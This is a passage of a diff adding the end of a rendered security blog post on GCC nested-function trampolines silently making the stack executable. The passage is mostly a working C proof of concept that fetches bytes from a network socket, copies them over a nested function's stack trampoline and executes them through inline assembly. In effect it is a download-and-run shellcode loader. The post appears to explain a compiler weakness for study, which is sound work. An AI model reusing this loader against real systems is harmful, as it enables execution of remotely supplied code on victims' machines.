+    size_t recvlen <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+    <span style=color:#66d9ef>struct</span> sockaddr_in remote;
+
+    sockfd <span style=color:#f92672>=</span> socket(AF_INET, SOCK_STREAM, <span style=color:#ae81ff>0</span>);
+
+    <span style=color:#66d9ef>if</span> (sockfd <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) {
+        <span style=color:#66d9ef>return</span> EXIT_FAILURE;
+    }
+    
+    remote.sin_addr.s_addr <span style=color:#f92672>=</span> inet_addr(destip);
+    remote.sin_family <span style=color:#f92672>=</span> AF_INET;
+    remote.sin_port <span style=color:#f92672>=</span> htons(destport);
+
+    <span style=color:#66d9ef>if</span> (connect(sockfd, (<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>struct</span> sockaddr <span style=color:#f92672>*</span>) <span style=color:#f92672>&amp;</span>remote, <span style=color:#66d9ef>sizeof</span>(remote)) <span style=color:#f92672>&lt;</span> EXIT_SUCCESS) {
+        ret_code <span style=color:#f92672>=</span> EXIT_FAILURE;
+        <span style=color:#66d9ef>goto</span> _FINAL;
+    } 
+    
+    <span style=color:#66d9ef>if</span> (sendto(sockfd, request, strlen(request), <span style=color:#ae81ff>0</span>, NULL, <span style=color:#ae81ff>0</span>) <span style=color:#f92672>&lt;</span> EXIT_SUCCESS) {
+        ret_code <span style=color:#f92672>=</span> EXIT_FAILURE;
+        <span style=color:#66d9ef>goto</span> _FINAL;
+    }
+
+    <span style=color:#66d9ef>if</span> (recv(sockfd, reply_buf, <span style=color:#ae81ff>512</span>, <span style=color:#ae81ff>0</span>) <span style=color:#f92672>&lt;</span> EXIT_SUCCESS) {
+        ret_code <span style=color:#f92672>=</span> EXIT_FAILURE;
+        <span style=color:#66d9ef>goto</span> _FINAL;
+    }
+
+    payload_ptr <span style=color:#f92672>=</span> strchr(reply_buf, <span style=color:#ae81ff>0xcc</span>);
+
+    <span style=color:#66d9ef>if</span> (NULL <span style=color:#f92672>==</span> payload_ptr) {
+        ret_code <span style=color:#f92672>=</span> EXIT_FAILURE;
+        <span style=color:#66d9ef>goto</span> _FINAL;
+    }
+
+    memcpy(outbuf, payload_ptr <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>, bufsiz);
+
+_FINAL:
+    shutdown(sockfd, SHUT_RDWR);
+    close(sockfd);
+    <span style=color:#66d9ef>return</span> ret_code;
+}
+
+<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>__attribute__</span> ((__naked__)) exec(<span style=color:#66d9ef>void</span> (<span style=color:#f92672>*</span>func)()) {
+    __asm__ <span style=color:#66d9ef>volatile</span> (  <span style=color:#e6db74>&#34;.intel_syntax noprefix;&#34;</span>
+                        <span style=color:#e6db74>&#34;call rdi;&#34;</span>
+                        <span style=color:#e6db74>&#34;.att_syntax;&#34;</span>
+                        <span style=color:#f92672>:::</span> <span style=color:#e6db74>&#34;rdi&#34;</span>
+    );
+}
+
+<span style=color:#66d9ef>void</span><span style=color:#f92672>*</span> <span style=color:#a6e22e>foo</span>(<span style=color:#66d9ef>void</span>) {
+    <span style=color:#66d9ef>int</span> bar(<span style=color:#66d9ef>void</span>) { 
+        <span style=color:#66d9ef>char</span> name_buf[<span style=color:#ae81ff>256</span>] <span style=color:#f92672>=</span> { <span style=color:#ae81ff>0</span> };
+        printf(<span style=color:#e6db74>&#34;I&#39;m a harmless function!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+        printf(<span style=color:#e6db74>&#34;Please tell me your name!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+        printf(<span style=color:#e6db74>&#34;Your name: &#34;</span>);
+        fflush(stdout);
+        fgets(name_buf, <span style=color:#ae81ff>255</span>, stdin);
+        name_buf[strcspn(name_buf, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#34;</span>)] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+        printf(<span style=color:#e6db74>&#34;Hi %s!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, name_buf);
+
+        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>; 
+    }
+    
+    <span style=color:#66d9ef>return</span> bar;
+}
+
+<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>) {
+    size_t i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+    byte outbuf[PAYLOAD_SIZE] <span style=color:#f92672>=</span> { <span style=color:#ae81ff>0</span> };
+
+    <span style=color:#66d9ef>if</span> (fetch_bytes(<span style=color:#e6db74>&#34;127.0.0.1&#34;</span>, <span style=color:#ae81ff>1337</span>, outbuf, PAYLOAD_SIZE) <span style=color:#f92672>!=</span> EXIT_SUCCESS) {
+        <span style=color:#66d9ef>return</span> EXIT_FAILURE;
+    }
+
+    byte <span style=color:#f92672>*</span>ptr <span style=color:#f92672>=</span> foo();
+
+    <span style=color:#66d9ef>for</span> (i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> PAYLOAD_SIZE;  i<span style=color:#f92672>++</span>) {
+        <span style=color:#f92672>*</span>(ptr <span style=color:#f92672>+</span> i) <span style=color:#f92672>=</span> outbuf[i]; 
+    }
+
+    exec((<span style=color:#66d9ef>void</span> (<span style=color:#f92672>*</span>)()) ptr);
+
+    <span style=color:#66d9ef>return</span> EXIT_SUCCESS;
+}
+</code></pre></div>
+</div>
+</article>
+<div id=footer-post-container>
+<div id=footer-post>
+<div id=nav-footer style=display:none>
+<ul>
+<li><a href=/>Home</a></li>
+<li><a href=/posts>Writings</a></li>
+<li><a href=/tags>Tags</a></li>
+<li><a href=/about>About</a></li>
+<li><a href=/members>Members</a></li>
+</ul>
+</div>
+<div id=toc-footer style=display:none>
+<nav id=TableOfContents></nav>
+</div>
+<div id=share-footer style=display:none>
+<ul>
+<li>
+<a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-gcc-silent-trampoline-execstack-abuse%2f" aria-label=Facebook>
+<i class="fab fa-facebook fa-lg" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="https://twitter.com/share?url=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-gcc-silent-trampoline-execstack-abuse%2f&text=gcc%20Silent%20Trampoline%20Execstack%20Abuse" aria-label=Twitter>
+<i class="fab fa-twitter fa-lg" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-gcc-silent-trampoline-execstack-abuse%2f&title=gcc%20Silent%20Trampoline%20Execstack%20Abuse" aria-label=Linkedin>
+<i class="fab fa-linkedin fa-lg" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-gcc-silent-trampoline-execstack-abuse%2f&is_video=false&description=gcc%20Silent%20Trampoline%20Execstack%20Abuse" aria-label=Pinterest>
+<i class="fab fa-pinterest fa-lg" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="mailto:?subject=gcc%20Silent%20Trampoline%20Execstack%20Abuse&body=Check out this article: https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-gcc-silent-trampoline-execstack-abuse%2f" aria-label=Email>
+<i class="fas fa-envelope fa-lg" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="https://getpocket.com/save?url=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-gcc-silent-trampoline-execstack-abuse%2f&title=gcc%20Silent%20Trampoline%20Execstack%20Abuse" aria-label=Pocket>
+<i class="fab fa-get-pocket fa-lg" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="http://reddit.com/submit?url=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-gcc-silent-trampoline-execstack-abuse%2f&title=gcc%20Silent%20Trampoline%20Execstack%20Abuse" aria-label=reddit>
+<i class="fab fa-reddit fa-lg" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-gcc-silent-trampoline-execstack-abuse%2f&name=gcc%20Silent%20Trampoline%20Execstack%20Abuse&description=author%3a%5bxoreaxeax%5d%20Danger%20by%20design%20of%20GNU%26rsquo%3bs%20GCC%20nested%20functions%20raises%20from%20use%20of%20trampolines%20-%20small%20pieces%20of%20code%20used%20to%20implement%20pointers%20to%20nested%20functions.%0aThese%20trampolines%20are%20created%20on%20stack%2c%20meaning%20the%20stack%20needs%20to%20be%20marked%20as%20executable%20for%20nested%20functions%20to%20be%20executed%20-%20the%20nested%20function%20pointer%20is%20after%20all%20the%20address%20of%20the%20trampoline%20itself.%0aExecutable%20stack%20is%20heavily%20frowned%20upon%20on%20modern%20systems.%20In%20this%20case%20however%2c%20the%20bigger%20problem%20arises%20from%20the%20stack%20being%20set%20to%20RWE%20%28Read%2fWrite%2fExecute%29%20silently%2c%20without%20any%20warning%20message%20during%20compilation%20and%20linking." aria-label=Tumblr>
+<i class="fab fa-tumblr fa-lg" aria-hidden=true></i>
+</a>
+</li>
+<li>
+<a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-gcc-silent-trampoline-execstack-abuse%2f&t=gcc%20Silent%20Trampoline%20Execstack%20Abuse" aria-label="Hacker News">
+<i class="fab fa-hacker-news fa-lg" aria-hidden=true></i>
+</a>
+</li>
+</ul>
+</div>
+<div id=actions-footer>
+<a id=menu-toggle class=icon href=# onclick="return $('#nav-footer').toggle(),!1" aria-label=Menu>
+<i class="fas fa-bars fa-lg" aria-hidden=true></i> Menu</a>
+<a id=toc-toggle class=icon href=# onclick="return $('#toc-footer').toggle(),!1" aria-label=TOC>
+<i class="fas fa-list fa-lg" aria-hidden=true></i> TOC</a>
+<a id=share-toggle class=icon href=# onclick="return $('#share-footer').toggle(),!1" aria-label=Share>
+<i class="fas fa-share-alt fa-lg" aria-hidden=true></i> share</a>
+<a id=top style=display:none class=icon href=# onclick="$('html, body').animate({scrollTop:0},'fast')" aria-label="Top of Page">
+<i class="fas fa-chevron-up fa-lg" aria-hidden=true></i> Top</a>
+</div>
+</div>
+</div>
+<footer id=footer>
+<div class=footer-left>
+Copyright &copy; 2022 SixSixtySix Corp.
+</div>
+<div class=footer-right>
+<nav>
+<ul>
+<li><a href=/>Home</a></li>
+<li><a href=/posts>Writings</a></li>
+<li><a href=/tags>Tags</a></li>
+<li><a href=/about>About</a></li>
+<li><a href=/members>Members</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+</div>
+</body>
+<link rel=stylesheet href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+<script src=/js/code-copy.js></script>
+</html>
